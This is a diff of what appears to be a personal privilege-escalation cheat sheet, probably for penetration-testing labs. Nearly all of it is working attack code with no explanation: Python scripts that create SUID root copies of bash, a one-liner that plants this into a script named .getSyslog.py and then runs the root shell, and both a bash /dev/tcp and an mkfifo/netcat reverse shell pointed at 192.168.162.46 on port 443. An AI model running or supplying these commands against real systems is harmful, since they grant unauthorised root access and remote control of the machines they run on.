@@ -31,13 +31,20 @@ export PATH=/dev/shm:$PATH
 Python rootbash 
 
 #!/usr/bin/env python
-import os
-import sys
+import os, sys
 #os.system('/usr/bin/touch /tmp/hello')
-#os.system('bash -i /dev/tcp/$MyIP/4444 0>&1')
+#os.system('bash -i /dev/tcp/192.168.162.46/443 0>&1')
 #os.system('chmod 4755 /bin/bash')
-os.system('cp /bin/bash /tmp/rbash; chown root:root /tmp/rbash; chmod +s /tmp/rbash')
+os.system('cp /bin/bash /tmp/rbash; chown root:root /tmp/rbash; chmod +xs /tmp/rbash')
 
+#!/usr/bin/python 
+import os, sys 
+os.system('cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash') 
+
+===================================
+Python One-Liner
+echo "os.system('cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash')" >> .getSyslog.py 
+/tmp/rootbash -p 
 
 =================================== 
 Path Trick
@@ -57,7 +64,7 @@ echo $PATH .:/usr/local/sbin:/usr/local/bin
 
 vim priv1.txt 
 #!/bin/bash 
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.21 443 > /tmp/f 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.162.46 443 > /tmp/f 
   
 vim priv2.txt 
 #!/bin/bash 
